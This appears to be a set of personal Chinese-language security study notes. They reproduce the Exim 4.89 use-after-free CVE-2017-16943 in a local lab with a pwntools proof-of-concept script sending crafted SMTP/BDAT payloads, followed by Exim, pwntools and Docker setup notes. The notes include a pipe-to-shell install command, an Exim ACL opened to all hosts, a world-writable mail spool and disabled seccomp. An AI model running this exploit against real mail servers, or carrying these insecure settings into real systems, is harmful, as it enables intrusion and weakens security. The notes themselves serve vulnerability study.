# EXIM

###### ***exim***

​	Exim是一个[MTA](https://baike.baidu.com/item/MTA)（**Mail Transfer Agent，邮件传输代理**）服务器软件，该软件基于[GPL协议](https://baike.baidu.com/item/GPL%E5%8D%8F%E8%AE%AE)开发，是一款开源软件，通常该软件会与[Dovecot](https://baike.baidu.com/item/Dovecot)或Courier等软件搭配使用。

​	邮件服务器—MTA—MUA—MTA—邮件服务器

​	Exim是一个MTA，负责邮件的路由，转发和投递，最著名的MTA有sendmail、qmail等程序。Exim和其他开源的MTA相比，最大的特点是配置极其灵活。Exim的配置文件是一个文本文件，支持String Expansion技术。能够执行诸如条件判断、[字符](https://baike.baidu.com/item/%E5%AD%97%E7%AC%A6)转换等功能。	

​	Exim有两种称为Driver的元素：Router和Transport。Router对一个邮件地址进行操作，决定如何投递，即交给那个Transport，或对地址进行转换。Transport将邮件从Exim的队列中投递到目的地。通过String Expansion，Exim几乎有了无限的扩展能力，实现无限复杂的需要。邮件系统管理员]可以根据自己的需要，设计相应的数据格式，然后通过String Expansion进行转换和判断。





# CVE-2017-16943 Exim UAF漏洞



1. 源码安装 exim-4.89

   - `wget http://sunsite.icm.edu.pl/ftp/site/exim/exim/exim4/old/exim-4.89.tar.gz`
   - 解压，网上教程是在src下新建Local文件夹，make时找不到目标
   - 在exim-4.89/Local目录下 `wget "https://bugs.exim.org/attachment.cgi?id=1051" -o Makefile` 
   - 修改Makefile文件134行，将用户名改为本机已存在用户
   - 先安装libdb-dev libpcre3-dev libssl-dev ,然后make && make install完成安装

2. 修改配置文件

   修改/usr/exim/comfigure文件的第364行，把 `accept hosts = :` 修改为

   `accept hosts = *`，并注释掉 `control = dkim_disable_verify`

3. /usr/exim/bin目录下，执行`./exim -bdf -d+all` 启动

4. 安装pwntools

   - 安装pyasn1   

     `git clone <https://github.com/etingof/pyasn1>`

     `python setup.py install`

   - 安装capstone

     `git`

     `make && make install`

   - `apt-get install pandoc python-dev python-pip`

   - `pip install pwntools`

5. 下载poc，执行

   ![1553829297737](C:\Users\loongxu\AppData\Roaming\Typora\typora-user-images\1553829297737.png)

   进入交互模式失败

6. poc代码

   ```python
   #pip install pwntools
   from pwn import *
   r = remote('127.0.0.1', 25)
             
   r.recvline()				#接收一行输出
   r.sendline("EHLO test")    
   # 发送载荷，并进行换行，末尾\n    ehlo发件人姓名，告诉smtp服务器发送者的用户名
   
   r.recvuntil("250 HELP")		
   #接收数据，直到收到“250 HELP”  HELP查询虚拟服务器在smtp会话中支持的smtp命令列表
   
   
   r.sendline("MAIL FROM:<test@localhost>")   #标识发件人
   r.recvline()
   r.sendline("RCPT TO:<test@localhost>")		#标识收件人
   r.recvline()								#接收一行输出
   r.sendline('a'*0x1250+'\x7f')
   r.recvuntil('command')
   r.sendline('BDAT 1')
   r.sendline(':BDAT \x7f')		#发送载荷，并进行换行，末尾\n
   s = 'a'*6 + p64(0xdeadbeef)*(0x1e00/8)
   #0xdeadbeef一般用于填充已分配未初始化的内存
   #p64/p32打包一个整数，打包为64位/32位
   #u64/u32解包一个字符串，得到整数
   r.send(s+ ':\r\n') 
   r.recvuntil('command') 	#接收到'command'为止
   r.send('\n')     #发送载荷
   r.interactive()  #shell数据交互
   ```

- ![](C:\Users\loongxu\AppData\Roaming\Typora\typora-user-images\1554357577090.png)
- ![1554358368118](C:\Users\loongxu\AppData\Roaming\Typora\typora-user-images\1554358368118.png)

- ![1554358460897](C:\Users\loongxu\AppData\Roaming\Typora\typora-user-images\1554358460897.png)




# exim安装配置

1. exim的ftp服务器获取文件

2. ```
   #wget  http://www.mirrorservice.org/sites/ftp.exim.org/pub/exim/exim4/old
   /exim-4.89.tar.gz
   ```

   解压 

   ```
   #tar -zvxf exim-4.89.tar.gz
   ```

3. 进入Local文件夹

4. ```
   #cd exim-4.89/Local
   ```

   将src目录下的EDITME文件复制到Local目录下

5. ```
   #cp  src/EDITME  ./Makefile
   ```

   编译

6. ```
   #make && make install
   ```

   /var/spool/mail对其他用户增加可写权限

   ```
   #chmod -R a+w /var/spool/mail
   ```

7. 将exim安装目录添加到PATH中

   ```
   法一：#export PATH=$PATH:/usr/exim/bin
   ```

   ```
   法二：#vim /etc/profile   添加内容export PATH=$PATH:/usr/exim/bin
   ```

8. 测试发送邮件

   ```
   loong@ubuntu:~$ exim -v loong
   LOG: MAIN
     Warning: No server certificate defined; will use a selfsigned one.
    Suggested action: either install a certificate or change tls_advertise_hosts option
   LOG: MAIN
     Warning: purging the environment.
    Suggested action: use keep_environment.
   From:loong
   To:loong
   Subject:testing exim
   this is a test message
   .
   LOG: MAIN
     <= loong@ubuntu U=loong P=local S=339
   loong@ubuntu:/var/mail$ LOG: MAIN
     Warning: No server certificate defined; will use a selfsigned one.
    Suggested action: either install a certificate or change tls_advertise_hosts option
   delivering 1hBG3z-0000EK-LR
   LOG: MAIN
     => loong <loong@ubuntu> R=localuser T=local_delivery
   LOG: MAIN
     Completed
   
   You have mail in /var/mail/loong
   loong@ubuntu:~$ 
   
   
   ```

9. 查看邮件

   ```
   loong@ubuntu:~$ cd /var/mail/
   loong@ubuntu:/var/mail$ cat loong 
   From loong@ubuntu Tue Apr 02 02:51:17 2019
   Return-path: <loong@ubuntu>
   Envelope-to: loong@ubuntu
   Delivery-date: Tue, 02 Apr 2019 02:51:17 -0700
   Received: from loong by ubuntu with local (Exim 4.89)
   	(envelope-from <loong@ubuntu>)
   	id 1hBG3z-0000EK-LR
   	for loong@ubuntu; Tue, 02 Apr 2019 02:51:17 -0700
   To:loong@ubuntu
   Subject:testing exim
   From: "ubuntu 16 server,,," <loong@ubuntu>
   Message-Id: <E1hBG3z-0000EK-LR@ubuntu>
   Date: Tue, 02 Apr 2019 02:51:17 -0700
   
   this is a test message
   
   loong@ubuntu:/var/mail$ 
   ```


# pwntools

1. 基本模块

   - **asm** : 汇编与反汇编，支持x86/x64/arm/mips/powerpc等基本上所有的主流平台
   - **dynelf**: 用于远程符号泄漏，需要提供leak方法
   - **elf**: 对elf文件进行操作，可以获取elf文件中的PLT条目和GOT条目信息
   - **gdb** : 配合gdb进行调试，设置断点之后便能够在运行过程中直接调用GDB断下，类似于设置为即使调试JIT
   - **memleak** : 用于内存泄漏
   - **shellcraft** : shellcode的生成器
   - **tubes** : 包括tubes.sock, tubes.process, tubes.ssh, tubes.serialtube，分别适用于不同场景的PIPE
   - **utils** : 一些实用的小功能，例如CRC计算，cyclic pattern等

2. context设置

   ​	context是pwntools用来设置环境的功能，在很多时候，由于二进制文件的情况不同，我们可能需要进行一些环境设置才能够正常进行exp，比如有一些需要进行汇编，但是32的汇编和64的汇编不同，如果不设置context会出现问题。

   ```
   context(os='linux',arch='amd64',log_level='debug')
   ```

   ​	os设置系统为Linux系统

   ​	arch设置架构为amd64，可以简单地认为设置为64位的模式，32位模式为‘i386’

   ​	log_level设置日志输出的等级为debug，这句话一般会在调试的时候设置，这样pwntools会将完整的IO过程都打印下来

3. 常用命令

   - send（payload）  发送payload

   - sendline（payload） 发送payload，并进行换行

   - sendafter（some_string，payload）收到some_string后，发送payload

   - recvn（N）接收N个字符

   - recvline（）接收一行输出

   - recvlines（N）接收N行输出

   - recvuntil（some_string）接收到some_string为止

   - p32/p64:打包一个整数、分别打包为32位或64位，返回一个字符串。p32(0x400010)=x10x00x40

   - u32/u64:解包一个字符串得到整数

4. 2

5. 


# docker

1. 使用脚本安装Docker

   ```
   $ wget -qO- https://get.docker.com/ | sh
   ```

2. ![](C:\Users\loongxu\AppData\Roaming\Typora\typora-user-images\1554342651721.png)

   根据提示添加使用docker的非root用户

   ```
   $ usermod -aG docker useranme
   ```

3. 配置镜像加速

   ```
   $ sudo mkdir -p /etc/docker
   $ sudo tee /etc/docker/daemon.json <<- 'EOF'
   {
       "registry-mirrors": ["https://2caf0eyp.mirror.swr.myhuaweicloud.com"]
   }
   EOF
   $ sudo systemctl daemon-reload
   $ sudo systemctl restart docker
   ```

4. 常用命令

   - -run：在容器内运行程序
   - -t：在新容器内指定一个为终端或终端
   - -i：允许对容器内的标准输入进行交互
   - -d：以进程方式运行的容器（让容器在后台运行）
   - -ps 查看有哪些容器在运行
   - -stop 停止容器
   - -pull： 载入镜像
   - -P：将容器内部使用的网络端口映射到我们使用的主机上
   - -p：设置不一样的端口 主机端口：容器端口

5. docker images #查看已下载镜像

6. docker search  #查找

7. docker save 镜像名 > /temp/asd.tar.gz 导出镜像

8. docker load < /temp/asd.tar.gz 导入镜像

9. docker rmi $IMAGE ID/$TAG删除镜像

10. docker run --name 容器名 -it 镜像名 -p port:port /bin/bash

11. docker中进行IDA远程调试提示“TRACEME: Operation not permitted[1] Closing connection from 192.168.109.1...”的解决方法:加入 --security-opt seccomp:unconfined选项，关闭docker远程命令执行保护，*注意：security选项一定要在-it参数之前，否则会报错“,如：

    docker run --security-opt seccomp:unconfined -it -p 23945:23946 ubuntu.17.04.i386 /bin/bash

12. 



nc   -zv ip|domain.com port 

​		-z 用户不想发送数据，nc不用等待用户输入

​		-v 输出详细的交互过程





python 简易服务器

python2    python -m SimpleHTTPServer port

python3    python -m http.server  port



linux 服务开机自启

systemctl enable servicename #systemctl enable apache2

systemctl disable servicename



scp远程文件拷贝

scp  localfile  remote_username@remote_ip:remote_folder

scp remote_username@remote_ip:remote_folder local_folder



WAF（Web Application Firewall） 网站应用级入侵防御系统，Web应用[防火墙](https://baike.baidu.com/item/防火墙)是通过执行一系列针对HTTP/HTTPS的[安全策略](https://baike.baidu.com/item/安全策略/2890163)来专门为Web应用提供保护的一款产品。WAF工作在应用层，WAF对来自Web应用程序客户端的各类请求进行内容检测和验证，确保其安全性与合法性，对非法的请求予以实时阻断，从而对各类网站站点进行有效防护。





POC：全称 ' Proof of Concept '，中文 ' 概念验证 ' ，常指一段漏洞证明的代码。

EXP：全称 ' Exploit '，中文 ' 利用 '，指利用系统漏洞进行攻击的动作。

Payload：中文 ' 有效载荷 '，指成功exploit之后，真正在目标系统执行的代码或指令。

Shellcode：简单翻译 ' shell代码 '，是Payload的一种，由于其建立正向/反向shell而得名。

---------------------------------------------------------------------------------------------------------------------------------------------------------

POC是用来证明漏洞存在的，EXP是用来利用漏洞的，两者通常不是一类，或者说，PoC通常是无害的，Exp通常是有害的，有了POC，才有EXP。

Payload有很多种，它可以是Shellcode，也可以直接是一段系统命令。同一个Payload可以用于多个漏洞，但每个漏洞都有其自己的EXP，也就是说不存在通用的EXP。

Shellcode也有很多种，包括正向的，反向的，甚至meterpreter。

Shellcode与Shellshcok不是一个，Shellshock特指14年发现的Shellshock漏洞。
